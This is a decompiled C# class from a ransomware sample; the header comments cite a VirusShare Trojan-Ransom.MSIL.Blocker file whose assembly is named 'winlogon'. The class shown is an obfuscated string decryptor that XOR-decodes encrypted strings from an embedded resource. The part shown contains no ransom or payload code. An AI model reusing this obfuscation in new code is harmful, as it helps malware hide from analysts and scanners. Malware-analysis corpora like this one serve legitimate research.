// Decompiled with JetBrains decompiler
// Type:  
// Assembly: winlogon, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 92BE594B-097B-419F-BA52-678600CDFEA7
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00024-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-e01416f400ce0b70a479fa73ab196195d540bcba32457839183e434f958fa820.exe

using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;

internal static class \u0003\u2000
{
  private static readonly Dictionary<int, string> \u0002 = new Dictionary<int, string>(728);
  private static BinaryReader \u0003;
  private static byte[] \u0005;
  private static short \u0008;
  private static bool \u0006;
  private static byte[] \u000E;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static string \u0002(int _param0)
  {
    lock (\u0003\u2000.\u0002)
    {
      string str1;
      if (\u0003\u2000.\u0002.TryGetValue(_param0, out str1))
        return str1;
      if (\u0003\u2000.\u0003 == null)
      {
        Assembly executingAssembly = Assembly.GetExecutingAssembly();
        Assembly.GetCallingAssembly();
        \u0003\u2000.\u0006 = false;
        \u0003\u2000.\u0003 = new BinaryReader(executingAssembly.GetManifestResourceStream("    \u200B     "));
        short count = (short) ((int) \u0003\u2000.\u0003.ReadInt16() ^ -6145);
        if (count == (short) 0)
          \u0003\u2000.\u0008 = (short) ((int) \u0003\u2000.\u0003.ReadInt16() ^ 29219);
        else
          \u0003\u2000.\u0005 = \u0003\u2000.\u0003.ReadBytes((int) count);
        \u0003\u2000.\u000E = executingAssembly.GetName().GetPublicKeyToken();
        if (\u0003\u2000.\u000E != null && \u0003\u2000.\u000E.Length == 0)
          \u0003\u2000.\u000E = (byte[]) null;
      }
      int num1 = _param0 ^ 72111933;
      \u0003\u2000.\u0003.BaseStream.Position = (long) num1;
      byte[] numArray;
      if (\u0003\u2000.\u0005 != null)
      {
        numArray = \u0003\u2000.\u0005;
      }
      else
      {
        short count = \u0003\u2000.\u0008 != (short) -1 ? \u0003\u2000.\u0008 : (short) ((int) \u0003\u2000.\u0003.ReadInt16() ^ -31632 ^ num1);
        numArray = count != (short) 0 ? \u0003\u2000.\u0003.ReadBytes((int) count) : (byte[]) null;
      }
      int count1 = \u0003\u2000.\u0003.ReadInt32() ^ num1 ^ -227646271;
      bool flag = (count1 & int.MinValue) != 0;
      if (flag)
        count1 &= int.MaxValue;
      byte[] bytes = \u0005\u2000.\u0002(numArray, \u0003\u2000.\u0003.ReadBytes(count1));
      if (\u0003\u2000.\u000E != null != \u0003\u2000.\u0006)
      {
        for (int index = 0; index < count1; ++index)
        {
          byte num2 = \u0003\u2000.\u000E[index & 7];
          byte num3 = (byte) ((int) num2 << 3 | (int) num2 >> 5);
          bytes[index] = (byte) ((uint) bytes[index] ^ (uint) num3);
        }
      }
      string str2;
      if (flag && !\u0003\u2000.\u0006)
      {
        char[] chArray = new char[count1];
        for (int index = 0; index < count1; ++index)
          chArray[index] = (char) bytes[index];
        str2 = new string(chArray);
      }
      else
        str2 = Encoding.Unicode.GetString(bytes, 0, bytes.Length);
      if (\u0003\u2000.\u0006)
        str2 = (_param0 + count1 ^ 936568).ToString("X");
      string str3 = string.Intern(str2);
      \u0003\u2000.\u0002.Add(_param0, str3);
      if (\u0003\u2000.\u0002.Count == 728)
      {
        \u0003\u2000.\u0003.Close();
        \u0003\u2000.\u0003 = (BinaryReader) null;
        \u0003\u2000.\u0005 = \u0003\u2000.\u000E = (byte[]) null;
      }
      return str3;
    }
  }
}
